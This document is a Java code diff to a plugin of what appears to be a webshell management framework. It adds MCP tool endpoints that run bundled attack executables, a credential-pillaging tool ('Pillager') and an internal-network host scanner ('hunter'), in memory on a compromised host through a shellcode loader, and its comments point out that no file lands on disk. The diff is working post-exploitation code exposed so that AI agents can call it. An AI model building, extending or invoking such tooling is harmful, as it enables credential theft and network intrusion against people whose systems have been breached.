@@ -43,6 +43,8 @@ import util.functions;
 import core.annotation.McpTool;
 import core.annotation.McpParam;
 import java.util.Map;
+import java.io.ByteArrayOutputStream;
+import java.io.PrintStream;
 
 public abstract class NewCmd implements Plugin {
     protected Payload payload;
@@ -900,6 +902,48 @@ public abstract class NewCmd implements Plugin {
         if (cmd == null || cmd.trim().isEmpty()) return "缺少参数: command";
         if (this.payload == null) return "payload 未初始化";
         return this.payload.execCommand(cmd);
+    }
+
+    @McpTool(name = "info1", desc = "获取信息1: 内网信息收集 (Pillager)", params = {
+            @McpParam(name = "shellId", required = true, desc = "Shell ID") })
+    public String mcpInfo1(Map<String, Object> args) {
+        return runInfo("assets/Pillager.exe", (String)null);
+    }
+
+    @McpTool(name = "info2", desc = "获取信息2: 内网主机扫描 (hunter)", params = {
+            @McpParam(name = "shellId", required = true, desc = "Shell ID") })
+    public String mcpInfo2(Map<String, Object> args) {
+        return runInfo("assets/hunter.exe", "all");
+    }
+
+    private String runInfo(String asset, String runArgs) {
+        if (this.shellEntity != null && this.shellEntity.getFrame() != null) {
+            if (this.loader == null) {
+                this.loader = this.getShellcodeLoader();
+            }
+            if (this.loader == null) return "未找到 ShellcodeLoader";
+        }
+        try {
+            byte[] pe = functions.readInputStreamAutoClose(NewCmd.class.getResourceAsStream(asset));
+            if (this.shellEntity != null && this.shellEntity.getFrame() != null) {
+                byte[] result = this.loader.runNetPe(runArgs, pe);
+                return this.encoding.Decoding(result);
+            }
+            // MCP 无 frame: TH_TOOLS 链内存加载 (PE->shellcode 内存执行, 无文件落盘)
+            String cn = this.payload.getClass().getName().contains("csharp") ? "shells.plugins.csharp.TH_TOOLS" : "shells.plugins.java.TH_TOOLS";
+            TH_TOOLS thTools = (TH_TOOLS) Class.forName(cn).newInstance();
+            thTools.init(this.shellEntity);
+            byte[] result = thTools.runNetPe(runArgs, pe, 7000, new PrintStream(new ByteArrayOutputStream()));
+            return Encoding.getEncoding(this.shellEntity).Decoding(result);
+        } catch (Exception e) {
+            java.io.StringWriter sw = new java.io.StringWriter();
+            e.printStackTrace(new java.io.PrintWriter(sw));
+            return "执行失败:\n" + sw.toString();
+        }
+    }
+
+    protected ShellcodeLoader createLoader() {
+        return null;
     }
 
     public void init(ShellEntity shellEntity) {
